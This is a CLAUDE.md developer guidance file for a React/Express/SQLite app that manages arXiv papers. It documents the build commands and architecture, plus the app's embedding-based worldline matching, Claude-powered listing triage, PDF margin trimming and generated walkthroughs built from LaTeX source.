# CLAUDE.md

This file provides guidance to Claude Code (claude.ai/code) when working with code in this repository.

## Build & Development Commands

```
npm run install:all       # Install dependencies for root, server/, and client/
npm run dev               # Start both frontend (Vite) and backend (Express) concurrently
npm run dev:server        # Backend only (Express on port 3001, uses tsx watch for hot reload)
npm run dev:client        # Frontend only (Vite on port 5173)
npm run build             # Build both client and server for production
npm run build:client      # Build frontend only (tsc && vite build)
npm run build:server      # Build backend only (tsc)
npm start                 # Start production server (serves API + built frontend from client/dist/)
```

The Vite dev server proxies `/api` requests to `http://localhost:3001`. No `.env` files are used. Server environment variables: `PORT` (defaults to 3001), `SUITE_DATA_ROOT` (optional, part of the suite data-centralization scheme), `CLAUDE_CLI_PATH` (optional, overrides where Scout looks for the `claude` binary), and `SIMILARITY_NUM_THREADS` (optional, caps the SPECTER2 ONNX intra-op thread pool; defaults to 2 to keep CPU/fan in check). The Claude API key is stored client-side in localStorage.

**`SUITE_DATA_ROOT` (data location).** The data directory is resolved in one place — `server/src/services/paths.ts` (imported by `database.ts` and `pdf.ts`). When `SUITE_DATA_ROOT` is set, data lives at `$SUITE_DATA_ROOT/navigate/` (`papers.db`, `pdfs/`, `pdf-cache/`); when unset, it falls back **byte-for-byte** to the legacy in-repo `server/data/`. Do not duplicate or "fix" this path — add new data under `DATA_DIR` from `paths.ts`.

## Architecture Overview

Full-stack TypeScript app: React 18 + Vite frontend, Express + SQLite backend. Manages academic papers from ArXiv with AI-powered analysis via Claude API.

**Historical note:** This project was originally a client-side-only React app with all data stored in localStorage. It was later migrated to a full-stack architecture with an Express backend and SQLite database. Most state now lives server-side, but a few visual preferences remain in localStorage (see Storage Split below). When working on features, always use the server-side API and database — do not add new localStorage usage for data that should be persistent or shared across sessions.

```
paperpile-navigate/
├── package.json          # Root scripts (concurrently for dev, install:all)
├── client/               # React frontend (Vite)
│   ├── src/
│   │   ├── main.tsx              # Entry point (React StrictMode + MathJax context)
│   │   ├── App.tsx               # Root component, 6 view modes, global state
│   │   ├── types.ts              # Shared interfaces + ARXIV_CATEGORY_GROUPS
│   │   ├── colorSchemes.ts       # 8 theme definitions with CSS custom properties
│   │   ├── styles/main.css       # Global styles, CSS variables, layout
│   │   ├── components/           # 17 React components
│   │   └── services/api.ts       # Centralized HTTP client + localStorage helpers
│   └── vite.config.ts            # Vite config with /api proxy to port 3001
└── server/               # Express backend
    ├── src/
    │   ├── index.ts              # Express entry point, mounts 10 route modules
    │   ├── types.ts              # Mirrors client types + category constants
    │   ├── routes/               # 11 RESTful route handlers
    │   └── services/             # Business logic (DB, ArXiv API, PDF, export, similarity)
    └── data/                     # Runtime data (gitignored)
        ├── papers.db             # SQLite database
        └── pdfs/                 # Downloaded PDF files
```

### Client (`client/src/`)

* **App.tsx** — Root component managing 6 view modes: `browse`, `library`, `authors`, `viewer`, `chatHistory`, `worldline`. Holds global state for papers, tags, and favorite authors. Initializes color scheme and font size from localStorage on mount.
* **components/** — 19 components:
  + `PaperBrowser` — Search/browse with category filters, query, pagination
  + `Library` — Saved papers list with tag/worldline/tier filters, multi-select bulk operations, unified import panel, and selection-driven export
  + `ImportPanel` — Tabbed panel combining ArXiv ID batch import, BibTeX import, and PDF upload
  + `PaperViewer` — Main reader: PDFViewer on left, tabbed sidebar (chat, comments, tags, export, info, worldline, import) on right. Supports immersive mode and browse-context navigation.
  + `PDFViewer` — react-pdf integration with page controls, search, annotations, and the trim-view menu (see Page Trimming below)
  + `ChatPanel` — Conversation UI: streamed markdown rendering, per-turn token/cost display, and the frozen context-mode badge (see Chat below)
  + `ChatHistory` — Lists all chat sessions per paper
  + `CommentPanel` — Per-page annotations with edit/delete
  + `TagPanel` — Add/remove tags on current paper
  + `ExportPanel` — BibTeX and Paperpile JSON export
  + `WorldlinePanel` — Worldline CRUD with D3 network visualization
  + `WorldlineSidebarPanel` — Paper list within a worldline with drag-drop reordering
  + `WorldlineInfoPanel` — Info panel for worldline viewer
  + `FavoriteAuthors` — Author management and publications feed
  + `SettingsModal` — API key, theme, similarity threshold, font size
  + `BatchImportPanel` — Bulk paper import with worldline/tag assignment
  + `ArxivRefreshTimer` — Countdown to next ArXiv announcement
  + `LaTeX` — MathJax wrapper component
* **services/api.ts** — Centralized API client (~630 lines). All backend calls go through a `request<T>()` helper with automatic JSON serialization. Includes functions for chat sessions, settings, and visual preference helpers (localStorage for color scheme and font size only).
* **types.ts** — Shared TypeScript interfaces (`ArxivPaper`, `SavedPaper`, `ChatSession`, `Tag`, `Worldline`, `CropBox`/`TrimMode`, etc.). Note: `authors` and `categories` are JSON strings in `SavedPaper` (parsed in routes). Defines `ARXIV_CATEGORY_GROUPS` constant with 14 groups and 140+ subcategories.
* **utils/autoTrim.ts**, **hooks/useAutoTrim.ts** — margin detection and the measuring loop behind page trimming (see Page Trimming below).
* **colorSchemes.ts** — 8 theme definitions (default-dark, solarized-dark/light, nord-dark/light, dracula-dark/light, one-dark-pro) applied via CSS custom properties.

### Server (`server/src/`)

* **index.ts** — Express entry point. CORS enabled, JSON body parser (10MB limit). Mounts 11 route modules under `/api`. Serves static client build from `client/dist/` in production with SPA fallback. Initializes database and PDF storage on startup.
* **routes/** — RESTful route handlers:
  + `arxiv.ts` — Search, categories, latest/recent papers, single paper fetch, PDF proxy (avoids CORS)
  + `papers.ts` — Full CRUD for saved papers + bulk operations (download-pdfs, delete-pdfs, delete, tier, add-tag, remove-tag) + sub-routes for comments and tags
  + `tags.ts` — Tag CRUD (name is UNIQUE)
  + `chat.ts` — Paper and worldline chat as SSE streams: session priming/resume, persistence, and `GET /backend-status`. Also API key verification. See Chat below.
  + `authors.ts` — Favorite authors + batch-fetches recent publications (concurrency limit: 3)
  + `export.ts` — BibTeX and Paperpile JSON generation. Citation key format: `{LastName}{Year}{ArxivId}`. Embeds tags as keywords and comments as notes. Also streams a ZIP archive of selected local PDFs (`GET /api/export/pdfs?ids=`).
  + `worldlines.ts` — Worldline CRUD, paper assignment with position ordering, embedding similarity scoring + flag log/dismiss/stats (see Similarity System below), batch import from ArXiv
  + `settings.ts` — Key-value settings CRUD (API key, similarity threshold, etc.)
  + `scribe.ts` — Hands selected papers' PDFs off to the Scribe app (`http://localhost:3003`) and deletes them locally
  + `scout.ts` — Opus-5 listing triage: `POST /scan` (idempotent per listing), `GET /runs` (diagnostics). See Scout below.
  + `walkthrough.ts` — generated interactive explainers: source manifest, outline, agentic build (202 + SSE), sandboxed bundle serving, vendored assets. See Walkthrough Mode below.
* **services/** — Business logic layer:
  + `database.ts` — SQLite with better-sqlite3. WAL mode, foreign keys enabled. 40+ query functions, all parameterized. Schema created/migrated in `initializeDatabase()`.
  + `arxiv.ts` — ArXiv REST API client (`http://export.arxiv.org/api/query`). XML parsing via xml2js. Functions for search, author search, single paper fetch, latest (RSS), and recent (HTML scraping).
  + `chat.ts` — the chat engine: frozen prompts, the `claude -p` flag vector, context resolution (TeX → PDF → abstract), stream parsing, and the CLI session store. Neither backend uses the Anthropic SDK — the `api` path calls the REST API via fetch. See Chat below.
  + `pdf.ts` — PDF storage management under `server/data/pdfs/`. Download, store, delete, path resolution. ArXiv IDs escaped (`/` → `_`) for filenames.
  + `similarity.ts` — embedding backends + similarity orchestration; `similarity-core.ts` holds the pure, unit-testable decision logic (see Similarity System below).
  + `paperpile.ts` — BibTeX/Paperpile export formatting with author name parsing.
  + `scout.ts` — library profile + Opus-5 listing triage over two backends (`claude -p` subprocess, or the REST API). See Scout below.

### Similarity System

**Precision-first embedding matching of browse papers to worldlines.** The goal is to flag only papers that *distinctively* belong to one thread, accepting missed recall over a daily spray of false positives. (History: this replaced an absolute-threshold centroid scorer, which itself replaced a TF-IDF cosine scorer — both over-fired. See `worldline-similarity-overhaul.md` for the full rationale.)

**Two files:**

* `similarity-core.ts` — **pure, model-independent, dependency-free** decision logic (no DB, no model imports), so it is unit-verifiable in isolation: `cosineSimilarity`, `nearestMemberScore`, `worldlineCohesion`, `matchWorldlines`, `applyExclusivityMargin`, and the text/author `corroborate` (+ `tokenize`, `documentFrequencies`, `normalizeAuthor`).
* `similarity.ts` — embedding backends + the orchestration that wires the core into the request flow and the SQLite caches.

**The pipeline, per browse paper, against every worldline:**

1. **Nearest-member score** — `s(p,W) = max over members m of cos(emb_p, emb_m)`. Not a centroid (a centroid of a multi-subtopic thread drifts toward the global mean and over-fires).
2. **Per-thread cohesion gate + self-margin** — keep `W` only if `s(p,W) ≥ cohesion(W) + selfMargin`, where `cohesion(W)` is the `cohesionPercentile`-th (default **0.75**) percentile of each member's nearest-sibling cosine, and `selfMargin` (default **0.02**) requires the paper to be *more tightly bound to the thread than the thread is to itself*. Self-calibrating: tight threads demand tight matches. This replaces the old single global threshold; the `settings` threshold is now only the fallback bar for <2-member threads. **The self-margin is the gate that actually bites** in the common single-candidate case (a paper near exactly one thread), which the runner-up margin below cannot catch — with SPECTER2's high, clustered similarities, a plain median cohesion bar admits a flood of same-subtopic papers.
3. **Exclusivity margin** — when a paper clears more than one thread, keep only the argmax and only if it beats the runner-up by ≥ `margin` (default 0.02). Result: **≤1 match per browse paper.**
4. **Required corroboration** — the embedding match must be backed by one concrete overlap: a shared author with a thread member, **or** ≥ `k` (default **3**) shared *distinctive* terms (corpus document-frequency fraction ≤ `distinctiveDfMax`, default **0.15**; the generic-ML stopword set cannot count).

**Tuning knobs** (request params on `POST /api/worldlines/similarity`): `cohesionPercentile`, `selfMargin`, `margin`, `k`. The defaults are **precision-first/low-recall** by design — your worldlines are subtopics and you browse the same categories, so the embedding cannot separate "in this subtopic" from "belongs to this thread"; the strict gate keeps the flood out at the cost of recall. Tune from the flag log + `npm run diagnose --prefix server` (which prints per-thread cohesion, cross-thread leakage, and a tuning simulation over logged flags) rather than guessing. A genuinely better precision signal (citations) remains future work.

**Opt-in (off by default).** Embedding similarity is **disabled by default** because it runs on CPU and re-embeds each newly-browsed category — left on, it pegs every core and spins the fan. The `similarityEnabled` setting (Settings → Worldline Similarity) gates it; when off, `PaperBrowser` makes no `/similarity` request, so the model is never even loaded. GPU acceleration is **not available** on this box: `onnxruntime-node`'s Linux build ships only CPU/CUDA/TensorRT providers (NVIDIA-only), and the machine's GPU is an AMD 7900XTX (would need a ROCm source build or a Python sidecar). The CPU cost is instead bounded by `SIMILARITY_NUM_THREADS` (default 2) capping the ONNX intra-op pool.

**Embedding backend** (`similarity.ts`): primary is **SPECTER2-proximity** (`adamlabadorf/specter2-proximity-onnx`) — citation-trained scientific paper embeddings whose proximity adapter is baked into the ONNX graph — run via **`onnxruntime-node` on CPU (no Python, no GPU)**. Inputs `input_ids`+`attention_mask`, output a pooled 768-d vector we L2-normalize. The session is created with `intraOpNumThreads: SIMILARITY_NUM_THREADS` / `interOpNumThreads: 1` / `executionMode: 'sequential'`. The tokenizer comes from `benchoi93/specter2-base-onnx-web` via `@huggingface/transformers`. If SPECTER2 fails to load, it falls back to the **all-MiniLM** transformers.js pipeline; if even that fails, similarity returns no flags (never a weaker scorer).

* **Input format:** title and abstract concatenated (`title + ' ' + abstract`).
* **Model cache:** the ONNX files (~441MB) download lazily on first use into `DATA_DIR/model-cache/specter2-proximity/` (so they follow `SUITE_DATA_ROOT`). First use re-embeds existing members under the new version; subsequent loads are instant.
* **Embedding cache + versioning:** vectors live in `paper_embeddings`, keyed by the **active backend's version string** (`specter2-proximity-v1` or `all-MiniLM-L6-v2`). This is critical: tagging by the producing backend means a fallback can never mix 768-d and 384-d vectors in the cache. Browse-paper embeddings are cached too (the same paper recurs across days/categories). Cohesion is recomputed per request from cached member embeddings (cheap); the route's result cache is invalidated on membership change.

**Instrumentation (`flag_log` table):** every flag writes a row `(arxiv_id, worldline_id, score, runner_up_score, margin, corroboration_kind, category, flagged_at, accepted, decided_at)` via `logFlag` (idempotent — `INSERT OR IGNORE` on `UNIQUE(arxiv_id, worldline_id)`). Assigning a paper to a worldline marks the flag **accepted** (`markFlagAccepted`, hooked into `POST /:id/papers` and batch-import); the browse-view × dismisses it (`markFlagDismissed` → `POST /api/worldlines/flag/dismiss`, only-if-pending). `GET /api/worldlines/flag-stats` returns acceptance rate overall and per category (diagnostic, not a cap). Use this accept/reject history to fit `cohesionPercentile`/`δ`/`k`.

**Schema addition:**

```sql
CREATE TABLE IF NOT EXISTS paper_embeddings (
    arxiv_id TEXT PRIMARY KEY,
    embedding TEXT NOT NULL,  -- JSON-serialized float array (768-d SPECTER2 / 384-d MiniLM)
    model_version TEXT NOT NULL DEFAULT 'specter-v1',
    created_at TEXT NOT NULL DEFAULT (datetime('now'))
);
CREATE INDEX IF NOT EXISTS idx_paper_embeddings_model ON paper_embeddings(model_version);
```

To swap models, change the backend's `version` string in `similarity.ts`; the version mismatch makes `getEmbeddings` recompute lazily under the new tag.

**Verification:** `npm run verify:similarity --prefix server` runs the model-independent unit harness over `similarity-core.ts` (Phases 1–3, incl. an isolated temp-DB test of the flag log via `SUITE_DATA_ROOT`). `npm run verify:specter2 --prefix server` is the model gate — it loads the active backend and checks a related paper pair scores clearly above an unrelated one. Both live in `server/scripts/`.

**Dependencies added:** `@huggingface/transformers` (tokenizer + MiniLM fallback) and `onnxruntime-node` (SPECTER2 ONNX inference), server-side only.

### Scout (Opus-5 listing triage)

**On-demand LLM triage of a browse listing against the whole library.** Where the Similarity System asks the narrow, cheap, local question *"does this paper belong to an existing worldline?"*, Scout asks the judgement-shaped one — *"given everything I've saved and how I rated it, is this worth my attention today?"* — which needs a model that can read an abstract. Same precision-first stance: it is capped at **8 findings**, told that "same subfield as something you saved" is not a reason, and told that an empty result is a correct answer on an ordinary day.

**Two files:** `services/scout.ts` (library profile, prompt, model call, output normalization) and `routes/scout.ts` (idempotency, persistence, error mapping).

**Flow.** The browse page's ⚡ **Scan listing** button posts the *currently displayed* papers (the active announcement tab, favorites feed, or search page) to `POST /api/scout/scan`. The server builds a **library profile** — worldlines with member titles, T0/T1-rated saves, tags, followed authors, recent saves, library size — from the **ever-saved ledger** rather than only the papers still stored here (see below), renders it into a cached system prompt, and sends the candidates as the user turn. Findings come back as `{arxivId, score (0–100), headline, reason, connections[]}` and are rendered as a highlighted block on the matching paper card, with a "Show only flagged" filter.

**The library profile spans every paper ever saved (`paper_archive`).** Papers leave Navigate — handed to Scribe for systematic study (`POST /api/scribe/send`, which deletes the local row), or simply cleared out. Before this ledger existed the profile was built from live tables alone, so *promoting a paper to deep study made Scout forget it* — precisely inverted, since that is the strongest statement of interest the user can make. Every save now writes a row to `paper_archive` (inside `savePaper`'s transaction, so no save path can skip it), and every deletion snapshots the paper's tier, tag names and worldline names into that row **before** the `paper_tags`/`worldline_papers` cascade destroys them, marking it `removed_at` with a `disposition` of `scribe` or `removed`.

`buildLibraryProfile()` then merges departed papers into every section **uniformly** — a departed paper still appears under its research thread, still carries its T0/T1 rating, and still counts in recent saves and the library size. The disposition is recorded but **not weighted**: a save is a judgement the user made, and deleting the row does not withdraw it. The rendered profile says how many papers are no longer stored locally and instructs the model to treat them the same. `currentlyHeld` sits in the profile alongside `totalSaved`, so it participates in the library fingerprint — sending a paper to Scribe surfaces as `libraryChanged` on a cached run, which is correct: the profile really did change.

Papers deleted *before* the ledger existed are unrecoverable; `initializeDatabase()` backfills it once from the current library (verified: all 521 papers enrolled, with nothing yet sent to Scribe, so no history was actually lost). `GET /api/papers/archive` returns the ledger (`?departed=true` for just the ones that left) with JSON fields parsed and an `inLibrary` flag.

⚠️ The **similarity system still reads live tables only** — a worldline member sent to Scribe drops out of that thread's cohesion and nearest-member scoring. Wiring the ledger into `similarity.ts` would need embeddings for departed papers (their abstracts are kept in `paper_archive`, so it is possible) and is not done.

**No redundant runs (the core constraint).** Every run is stored in `scout_runs`, keyed by `sha256(category | sorted candidate arXiv IDs)` — the identity of *the exact listing triaged*. Pressing the button again while arXiv hasn't announced returns the stored verdict with `cached: true` and **no API call** (it doesn't even need an API key). A new announcement changes the ID set, hence the key, hence a fresh run. Concurrent requests for the same key are coalesced in memory, so a double-click can't become two paid calls. `force: true` (the **Rescan** button) overrides and upserts the row.

The run also stores a **library fingerprint** (a hash of the rendered profile). It deliberately does *not* participate in the cache key — saving a paper mid-session should not silently re-bill the listing — but a mismatch surfaces as `libraryChanged: true`, which the status bar shows as "library changed since" next to Rescan.

**Two backends**, selected by the `scoutBackend` setting (server-side, via `PUT /api/settings/scoutBackend`):

* **`cli` (default)** — shells out to `claude -p`. Scans bill against the local **Claude Code subscription** rather than metered API credits, and no API key has to be stored. Requires the `claude` CLI on the server process's PATH (override with the `CLAUDE_CLI_PATH` env var).
* **`api`** — posts to the Anthropic REST API with the stored `claudeApiKey`, the way `chat.ts` does. For a headless deploy with no CLI, or when scans should bill to the API account.

Both produce the same validated `ScoutFinding[]`; the backend used is recorded on the run and returned to the client, because the cost figure means different things on each.

**Model call — `cli`.** `buildCliArgs()` assembles: `-p --output-format json --model claude-opus-5 --effort medium --tools "" --system-prompt <scout prompt> --json-schema <findings schema> --no-session-persistence --strict-mcp-config`. Three of those matter:

* `--system-prompt` **replaces** Claude Code's coding-agent prompt — this is a text-judgement task, not a coding session.
* `--tools ""` disables every built-in tool. Nothing here should touch the filesystem or network.
* `--json-schema` is the CLI's structured-output validation, so the envelope comes back with a parsed `structured_output` object plus real `usage` and a `total_cost_usd` the CLI computes itself.

⚠️ **The subprocess must run from a neutral cwd** (`os.tmpdir()`). Claude Code auto-discovers `CLAUDE.md` by walking up from its working directory, so spawning inside this repo silently prepends ~10k tokens of project context to *every* scan — measured at 10,835 vs 602 cached tokens ($0.11 vs $0.008) for an identical trivial prompt.

**Model call — `api`.** `claude-opus-5` via REST (no SDK). Adaptive thinking is on by default on Opus 5 and `max_tokens` (16000) bounds thinking + output together. `output_config.effort: 'medium'` — Opus 5 is unusually strong at the lower effort levels and this is a bounded judgement task. Output is constrained with `output_config.format`; if that parameter is rejected with a 400 the call retries once asking for JSON in the prompt, since `normalizeFindings` validates either way.

`normalizeFindings` is the trust boundary for both backends: findings naming a paper that wasn't in the candidate set (or a duplicate) are dropped, scores clamped to 0–100, results capped and sorted.

**Cost.** Listings are capped at **120 candidates** (`MAX_CANDIDATES`) and abstracts truncated to 1200 chars; the response reports how many were skipped. On the `api` backend the system prompt carries a `cache_control: ephemeral` breakpoint so back-to-back scans on an unchanged library re-read that prefix; the CLI caches the same prefix on its own (observed 1h ephemeral). Per-run token usage and cost are stored and shown in the status bar — prefixed `≈` on the `cli` backend, where the figure is the **list-price equivalent** of work billed to the plan, not money charged to an API account. `GET /api/scout/runs` lists recent runs for spend/finding history.

**Verification:** `npm run verify:scout --prefix server` covers everything that doesn't need a model call — scan-key identity (order-insensitive, set-sensitive), library fingerprinting, the ever-saved ledger (snapshot-before-cascade, departed papers surviving in the profile, re-save restoring a paper without rewriting its first-saved date), the run store's upsert-on-rescan, model-output normalization, and the CLI argument vector — against an isolated temp DB via `SUITE_DATA_ROOT`.

### Page Trimming (auto-crop)

**Hides a PDF's margins so the text fills the viewer.** Ported from Scribe's Trim View (itself modelled on Okular's `View → Trim View`), and tuned for papers rather than scanned books. Measured over this library, trimming keeps ~70% of the page area, which is ~1.25× wider text at the same window size.

Two client-side files, no server work beyond one setting:

* `client/src/utils/autoTrim.ts` — the detector. Pure and pdf.js-free apart from two structural interfaces (`TrimDocument`/`TrimPage`), so it isn't pinned to the pdfjs-dist version react-pdf owns transitively. A page is rendered at 320px wide onto an off-screen canvas, background luminance is estimated from the border ring, and the ink bounding box is taken with a 1-pass erosion plus a row/column ink gate so margin specks can't defeat it. Pages that measure untrustworthy (blank, a lone page number, <15% content) return `null` and are skipped rather than trusted. Boxes are `CropBox` fractions in viewer space and are in-memory only.
* `client/src/hooks/useAutoTrim.ts` — the measuring loop: a queue pumped between `requestIdleCallback`s (measuring competes with the viewer's own rendering), a per-document cache, and a generation counter so a document swap abandons in-flight results.

**Modes** (`TrimMode`, chosen from the toolbar's ⧉ crop menu; re-picking the active one turns trimming off):

* **`uniform`** — one box for the whole document. It measures **every page** (capped at `MAX_UNIFORM_PAGES` = 400, above which it falls back to a spread sample) and applies **nothing until the sweep completes** — the toolbar shows "measuring…" meanwhile. This is required, not conservative: the box is the *smallest* margin found, so a partial sweep would be tighter than the document allows and would clip. `uniformComplete` is derived from the attempt count, so a sweep interrupted by switching trimming off resumes and is never applied half-done.
* **`page`** — Okular's literal behaviour: each page trimmed to its own box, measured lazily in a window around the reading position (with an 8-page spread as the backing sample). Pages then differ in size. Useful for the occasional scanned submission whose content wanders, and for a paper where one full-bleed page spoils the uniform box.

**Two deliberate departures from Scribe** (both in `aggregateCrops`, with the reasoning in the code):

1. **No per-parity box.** Scribe keeps separate odd/even boxes because a bound book alternates its gutter. arXiv PDFs are single-sided, so one box is correct — and it keeps every page the same size, which is what lets the viewer size off-screen page placeholders from a single page height.
2. **A plain minimum, not the minimum of the *typical* pages.** Scribe discards pages whose margin is under half the median so a full-bleed illustration can't reopen the crop for a whole book. On papers that filter only over-trims, because the pages it calls atypical are wide figures, tables and display equations — content, not decoration. Measured over 25 papers from this library (every page of each): the filter clipped content on 3 of them, up to 4.7% of the page width, while trimming no more on average than the plain minimum (70.0% vs 70.4% of page area kept). The minimum also carries a guarantee worth having — **no measured page has its content clipped** — at the cost that a genuinely full-bleed page disables trimming on that side (use `page` mode there).

**Marginal stamps are not content (`skipMarginBand`).** arXiv prints the paper's ID down the left margin of every preprint's first page, in rotated ~9pt type outside the text block. To a plain bounding box that is ink like any other — and since the document box is the *smallest* margin on any page, that one page reopened the left margin for the whole paper. This was the cause of the wide left gutter trimming used to leave. The stamp is discarded by shape rather than by page number, so the same rule catches line numbers on a review copy or a journal's submission stamp, on either side: the outermost run of inked columns is skipped only when it is **thin** (≤6% of the page), **ends within 15% of the page edge**, is **separated from the body by ≥0.6% blank page**, and is **≥8× taller than it is wide**. Content that reaches the margin (a wide figure, a full-bleed table) fails all of those and still opens the box up as before. The four bounds are fitted to the 219 stamped first pages in this library, measured from their text layers with `pdftotext -bbox` — thickness p50 0.029/max 0.037, reach max 0.075, gap min 0.008/p05 0.028, aspect min 18 — each set clear of the observed worst case, with the most slack on thickness because a rendered stamp is a block or two fatter than its glyph boxes once antialiased. Rows are then counted across the surviving columns only, since the banner routinely overhangs the text block vertically and would otherwise pin the top and bottom too.

**How the crop is applied.** The page renders whole inside a smaller `.pdf-page-crop` box (`overflow: clip`) with a negative offset, so pdf.js's geometry, the text layer, link annotations and every stored comment rect keep their full-page coordinates — nothing about trimming touches persisted data. Consequences handled in `PDFViewer`:

* **Fit-to-width** divides by the surviving width fraction, so trimming actually buys reading size instead of leaving empty gutter. It always uses the document-wide box, even in `page` mode, or the zoom would jitter as per-page measurements landed. The refit runs in a `useLayoutEffect` (same paint, no flash) and re-scrolls to the current page, since the geometry moved under the reader.
* **Off-screen page placeholders** shrink to the trimmed height, or scrolling would jump as pages mounted.
* **Text-selection page attribution** tests the *visible* box, not the page element: a trimmed page's element still overhangs its clip box and would otherwise claim its neighbour's selections.
* **The comment overlay** stays outside the clipping box, offset onto the full page's frame, so a tooltip anchored to the first line can still overflow above the page.

**Persistence.** The mode lives in the `settings` table as `pdfTrimMode` — server-side and **global**, not per paper: arXiv PDFs are homogeneous, so a reader who wants margins gone wants them gone everywhere, and a per-paper box would be re-measured to the same answer each time.

**Not ported:** Scribe's manual crop overlay (drag-the-edges) and its export-with-crop, which needs `pdf-lib`. Navigate hands PDFs to Scribe for that.

**Verification:** `npm run verify:autotrim --prefix server` runs the detector and the aggregation over synthetic pages — no pdf.js, no canvas, no PDFs — covering measurement geometry, polarity independence (dark scans), blank/scrap rejection, dust erosion, marginal-stamp rejection (including each guard that keeps real margin content), and the never-clip property of the document box.

### Walkthrough Mode (generated interactive explainers)

**A short sequence of scenes that explain what a paper actually does, with live visuals you can manipulate — built by a model that has read the paper's LaTeX source rather than a rasterized page.** It sits between triage and study: the fast *"do I actually understand the mechanism"* pass on a paper Scout flagged. It does not replace reading; it decides whether reading is worth it. Plan and rationale: `walkthrough-mode.md`.

**Why TeX source, not the PDF.** The PDF is a *rendering*; the source is what the rendering was made from. Everything a builder needs and a PDF reader must reconstruct is present verbatim: `\begin{equation}` with `\label` instead of glyph runs, `\newcommand` definitions instead of per-occurrence inference, explicit `\section` structure instead of font-size heuristics. Measured on `1706.03762`: the source package is 1.15 MB gzipped and distills to **40 KB / ~10k tokens** — one comfortable call. Distillation is therefore about **fidelity, not cost**.

**Five stages.**

```
1. acquire  services/texsource.ts   arXiv /e-print → cached, path-safe source tree
2. distill  services/texdistill.ts  tree → flattened TeX + structure + figures     [pure]
3. outline  services/walkthrough.ts distilled → scene outline JSON (cheap, editable, can say "none")
4. build    services/walkthrough.ts outline → self-contained bundle.html (agentic `claude -p`)
5. serve    routes/walkthrough.ts   sandboxed iframe + strict CSP
```

`texdistill.ts` is **pure and dependency-free** — no DB, no network, no model, not even a Node builtin — the same way `similarity-core.ts` is. That is what makes the fiddliest part of the feature, LaTeX heterogeneity, unit-testable against fixtures.

**Stage 1 — acquire.** `https://arxiv.org/e-print/<id>` 301s to `/src/<id>` and *always* answers `content-type: application/gzip`; **the content type does not tell you the container.** The classifier is `content-disposition`'s filename, confirmed by magic bytes after gunzip: `arXiv-1706.03762v7.tar.gz` → gzipped tar; `arXiv-hep-th9711200v3.gz` → a **bare gzipped single file** whose gzip header preserves the original name (`conffo.tex`); `….pdf` → a PDF-only submission with no source. The filename also carries the version actually served (`v7`), recorded because a walkthrough is built against a specific version. Fetched through `arxivFetch` with a new **`'src'` gate (2 s, its own queue)**, not a raw `fetch`.

The **tar reader is hand-rolled**, not a dependency: the format is simple, and writing it means the path-safety guarantees are enforced by code that is directly unit-testable. Extraction rejects `..`, absolute paths, drive letters and NUL bytes, skips symlinks/hard links/device nodes/FIFOs outright, re-checks the resolved path against the destination root before writing a byte, and caps per-file (20 MB), total (200 MB) and download (50 MB) sizes. Only `.tex/.sty/.cls/.bbl/.bib/.txt` plus rasters are written; **every** entry name is still recorded, because figure resolution needs to know `figure1` was a `.pdf` even though the `.pdf` was skipped. Cache lives at `DATA_DIR/tex/<escaped id>/`, LRU-evicted on a byte budget.

**Fallback chain, probed not assumed:** source package → arXiv's LaTeXML HTML at `/html/<id>` (broad coverage but *not* universal, larger than the TeX, and it has already lost the macros) → title + abstract only, marked degraded in the UI.

**Stage 2 — distill.** Output: `{mainFile, flattenedTex, macros, structure, labels, figures, citations, warnings}`.

* **Main-file detection**, in order: the only `.tex` → a file with `\documentclass` → a file with `\begin{document}` → **the largest `.tex`**. The last tier is not laziness: `hep-th/9711200` is plain TeX with harvmac and contains **neither**. Files that something else `\input`s are excluded from the candidate pool first.
* **`\input`/`\include` resolution** — recursive, depth-capped, cycle-detected, with the TeX extension rule and the plain-TeX `\input name` form. Missing targets are warnings, never failures (`\input harvmac` is normal — arXiv supplies it). ⚠️ The `\input` regex is built by a **factory, not a shared `/g` constant**: `expand()` recurses from inside its own `exec` loop, and a shared `lastIndex` rewinds the outer scan and re-expands forever ("Invalid string length" on a real paper). There is a regression guard for this.
* **Comment stripping** respecting `\%`, `\verb` and verbatim environments. Author comments are a *liability*, not lost context — 10 of the 26 greppable `\newcommand`s in `1706.03762` are commented-out, including a block that redefines `\kq` differently. Stripping first is why the distiller reports **16 macros, and 16 is the right answer.**
* **Macro capture** — `\newcommand`/`\renewcommand`/`\providecommand`/`\def`/`\let`/`\DeclareMathOperator`/`\newenvironment`, kept **verbatim and hoisted to the top**. They are never expanded: the model reads a definition better than a half-correct expander rewrites its forty uses, and a wrong expansion is silent. A resolved `\input` target that is *all* definitions contributes its macros but not its text.
* **Structure map** includes harvmac's `\newsec`/`\subsec` — without them the plain-TeX physics papers that force the main-file fallback distill to a structure map of length zero.
* **Citations** come from `.bib`, `.bbl` **and an inline `\begin{thebibliography}`** — `1706.03762` ships all 40 of its entries that way. `\cite{key}` markers survive the bibliography's removal so a scene can name the work it replaces.
* **Budget** (`MAX_TEX_CHARS`, 400k): appendices first, then proof bodies, then experimental-detail sections, recording exactly what was dropped.

**Stage 3 — outline (the gate).** One structured `claude -p` call (Opus 5, medium effort, `--json-schema`) returning `{fitness: {verdict, reason}, thesis, scenes[]}`. The prompt asks *what specific object in this paper is worth manipulating and what would the reader learn by manipulating it* — **not** "design a visualization". If it cannot name the object and the lesson, the answer is `none`.

⚠️ **Every visual is required to be interactive; a designed *static* diagram has no category.** The outline prompt asks what is worth *manipulating*, `visual.spec` must name the reader's *control*, `CONTRACT.md` is a contract for an "interactive explainer", and `normalizeOutline` forces `kind: 'none'` on a `none` verdict. "Static" appears only as the WebGL fallback and as figures lifted from the paper. The consequence is that papers whose contribution is *structural* — an architecture, a construction, a proof skeleton — fall to prose, exactly where one good diagram would help most. This is a deliberate choice with a stated rationale (a fixed vocabulary converges to a template), not a bug, but it is under review: see *Static visuals — an unresolved gap* in `walkthrough-mode.md`, which proposes an orthogonal `visual.mode` and the four-paper A/B that has to run before anything changes.

**`fitness: "none"` is a first-class, correct outcome.** A model asked to animate an arbitrary paper will *always* produce something; for a benchmark-table-and-ablation paper that something is a spinning cube beside a restated abstract — a dollar spent to teach nothing, and a confident-looking artifact that misrepresents the paper. A `none` verdict still builds, as prose + equations + static figures, at a fraction of the cost. `normalizeOutline` is the trust boundary (Scout's `normalizeFindings` role): scenes capped at **8**, equation labels not in the paper's own label list dropped, fitness enum validated, and a `none` verdict cannot smuggle an animated scene through.

**The outline is editable before you pay for the build.** That is the main quality lever in the feature, so it exists from the start. Editing a never-built row updates it in place; editing a `ready` row **forks a new row**, because a previous build is sometimes the better one and re-rolling must not destroy it.

